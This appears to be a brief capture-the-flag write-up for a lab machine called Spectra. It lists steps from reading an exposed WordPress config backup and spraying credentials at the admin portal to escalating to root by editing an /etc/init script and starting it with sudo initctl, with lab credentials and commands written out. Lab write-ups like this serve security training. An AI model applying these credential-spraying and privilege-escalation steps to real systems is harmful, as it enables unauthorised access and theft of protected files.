THINGS LEARNT:

[+] Do proper enumeration. Cannot stress enough how important 'Try Harder' is.
[+] Just because a link is broke, don't assume it's a dead end. Seen here with the testing directory hiding wp-config


PROCESS:

[1] view-source:http://spectra.htb/testing/wp-config.php.save
[2] spray creds against wp admin portal - administrator:devteam01
[3] see autologin script in /opt - mentioned file points to credentials katie:SummerHereWeCome!!
[4] sudo -l to see /sbin/initctl has global sudo perms
[5] edit any script in /etc/init/ -> cp /root/root.txt /home/katie/flag.txt && chmod 7777  /home/katie/flag.txt && sleep 15 && rm /home/katie/flag.txt
[6] sudo /sbin/initctl start test1 --system
[7] cat /home/katie/flag.txt
